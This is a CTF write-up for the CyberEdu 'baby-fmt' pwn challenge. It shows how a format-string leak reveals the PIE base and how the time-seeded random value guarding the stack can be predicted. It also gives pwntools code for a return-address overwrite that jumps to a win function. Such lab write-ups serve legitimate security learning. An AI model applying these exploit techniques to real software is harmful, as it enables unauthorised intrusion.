+++
date = '2025-12-26'
draft = false
title = 'CyberEdu baby-fmt Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Format-String"]
+++


Merry Christmas everyone! 🎄

## Challenge overview

**[This](https://app.cyber-edu.co/challenges/3d3ef3d0-94fb-11ea-93fe-e7b039c31d38?tenant=cyberedu)** is should be a basic pwn challenge but please be aware that time is not your friend.

![challenge-screenshot](pic2.png#center)

Let's check out the restrictions we're dealing with.

![challenge-screenshot](pic1.png#center)

We're working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let's take a look at the disassembled binary.

We have a function called by `main`, let's call it `vuln`.

![challenge-screenshot](pic3.png#center)

Then, a `win` function.

![challenge-screenshot](pic4.png#center)

A function that checks whether a string passed as an argument appears inside `"bucurest iasi cluj timisoar brasov constant"`

![challenge-screenshot](pic5.png#center)

And lastly, a hacking detection function that checks that we didn't modify the value of `dword_402C`, a "randomly" generated variable in `vuln`.

![challenge-screenshot](pic6.png#center)


---

## Identifying the vulnerabilities

Our main concern here should be finding a way to redirect into our `win` function. So let's break down what happens in `vuln`.

First, `v5` is assigned a random value like so:

```python
v0 = time(0);
  srand(v0);
  v5 = rand();
  dword_402C = v5;
```

This means all random numbers generated this way that same second will be the same.

Next, we input 8 bytes into `s`, and then the newline gets turned into a null byte. To access the fmtstr vulnerability, we need to reach the vulnerable branch of the `if`, which means our `s`, or *city*, can't be contained by the city string.

Then, the `gets(v4);` leaves us with a buffer overflow, and `v5` operating something like a canary. No problem though, because we can just find it out ourselves.

---

Alright, so we can only print values one at at time, because of the small `s` buffer. Since we can only pick one to see, we'd better find the PIE base and another way to get that `v5` random value.

At offset 17, I found an address that's `PIE base + 0x148f`, and upon checking, it's actually `main`. From that, we can calculate `win`. Next, we just need to simulate the random number generation.

![challenge-screenshot](pic7.png#center)

---

## The exploit

Getting `v5` will be pretty easy; we just need to generate our own number with the same lines of code, inside out python script. We can use `ctypes` for that. 

Essentially, what that means is we can write our own identical C code inside python. To make sure we get the correct number, I took a range of 10 seeds, just in case. Then I picked the one corresponding to the value of `dword_402c` in gdb with gef, and I settled on the 5th one, which was just *now*. But I still left the loop in, just in case timings will differ remotely *(great foresight on my part)*.

![challenge-screenshot](pic8.png#center)

```python
from pwn import *

from ctypes import CDLL
import time

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

now = int(time.time())

i=5
j=1

for seed in range(now - 5, now + 5):
    libc.srand(seed)
    random = libc.rand()
    print(seed, random)
    if i==j:
    	random_number = random
    
    j=j+1
    
print(f"random number for i={i} is {random_number}")
```

Now, we can create our payload properly without getting detected:

```python
p.recvuntil(b'?\n')
p.sendline(b"%17$p")
p.recvline()

main = int(p.recvline().strip(), 16)
print(hex(main))

#17 is pie base + 0x148f
pie = main - 0x148f
win = pie + 0x133b
print(hex(win))

p.recvuntil(b'?\n')

#gets(v4)

v4 = b"A"*5
#the actual v4 buffer

v4 += p32(random_number)
#4 byte v5

v4 += b'\x90' * 20
#padding until rbp

v4 += b'\x90' * 8
#rbp, 8 bytes

v4 += p64(win)
#win finally

p.sendline(v4)
```

And, we get our flag locally! 

![challenge-screenshot](pic9.png#center)

Time to test it out remotely... We might encounter the problem of different libc versions for the random generator or offsets, or both!

Looks like it was offsets now.

![challenge-screenshot](pic11.png#center)

I found another PIE looking address at offset 8, and I assumed it was `PIE base + 0x1400`. I messed around with different `i` values for a while, and after trying everything from `now-5` to `now+5`, I was ready to give up, but I told myself I'd extend the radius a little and went up to `now+10`. I set the `i` to 20 so I would actually use the `now+10` seed, and I was completely shocked to see I *actually* got the flag! 

![challenge-screenshot](pic12.png#center)

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/babyfmt.py)**.
